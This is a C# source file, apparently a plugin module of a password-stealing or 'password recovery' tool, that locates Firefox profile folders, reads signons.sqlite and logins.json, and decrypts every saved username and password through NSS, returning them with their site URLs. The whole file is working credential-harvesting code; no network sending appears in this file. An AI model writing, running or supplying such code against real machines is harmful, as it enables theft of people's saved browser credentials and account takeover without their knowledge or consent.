using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;

namespace Plugin.Browsers.Firefox
{
    class FirefoxPassReader : IPassReader
    {
        public string BrowserName { get { return "Firefox"; } }
        public IEnumerable<CredentialModel> ReadPasswords()
        {
            string signonsFile = null;
            string loginsFile = null;
            bool signonsFound = false;
            bool loginsFound = false;
            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));

            var logins = new List<CredentialModel>();
            if (dirs.Length == 0)
                return logins;

            foreach (string dir in dirs)
            {
                string[] files = Directory.GetFiles(dir, "signons.sqlite");
                if (files.Length > 0)
                {
                    signonsFile = files[0];
                    signonsFound = true;
                }

                // find &quot;logins.json"file
                files = Directory.GetFiles(dir, "logins.json");
                if (files.Length > 0)
                {
                    loginsFile = files[0];
                    loginsFound = true;
                }

                if (loginsFound || signonsFound)
                {
                    FFDecryptor.NSS_Init(dir);
                    break;
                }

            }

            if (signonsFound)
            {
                using (var conn = new SQLiteConnection("Data Source=" + signonsFile + ";"))
                {
                    conn.Open();
                    using (var command = conn.CreateCommand())
                    {
                        command.CommandText = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
                        using (var reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string username = FFDecryptor.Decrypt(reader.GetString(0));
                                string password = FFDecryptor.Decrypt(reader.GetString(1));

                                logins.Add(new CredentialModel
                                {
                                    Username = username,
                                    Password = password,
                                    Url = reader.GetString(2)
                                });
                            }
                        }
                    }
                    conn.Close();
                }

            }

            if (loginsFound)
            {
                FFLogins ffLoginData;
                using (StreamReader sr = new StreamReader(loginsFile))
                {
                    string json = sr.ReadToEnd();
                    ffLoginData = JsonConvert.DeserializeObject<FFLogins>(json);
                }

                foreach (LoginData loginData in ffLoginData.logins)
                {
                    string username = FFDecryptor.Decrypt(loginData.encryptedUsername);
                    string password = FFDecryptor.Decrypt(loginData.encryptedPassword);
                    logins.Add(new CredentialModel
                    {
                        Username = username,
                        Password = password,
                        Url = loginData.hostname
                    });
                }
            }
            return logins;
        }

        class FFLogins
        {
            public long nextId { get; set; }
            public LoginData[] logins { get; set; }
            public string[] disabledHosts { get; set; }
            public int version { get; set; }
        }

        class LoginData
        {
            public long id { get; set; }
            public string hostname { get; set; }
            public string url { get; set; }
            public string httprealm { get; set; }
            public string formSubmitURL { get; set; }
            public string usernameField { get; set; }
            public string passwordField { get; set; }
            public string encryptedUsername { get; set; }
            public string encryptedPassword { get; set; }
            public string guid { get; set; }
            public int encType { get; set; }
            public long timeCreated { get; set; }
            public long timeLastUsed { get; set; }
            public long timePasswordChanged { get; set; }
            public long timesUsed { get; set; }
        }
    }
}
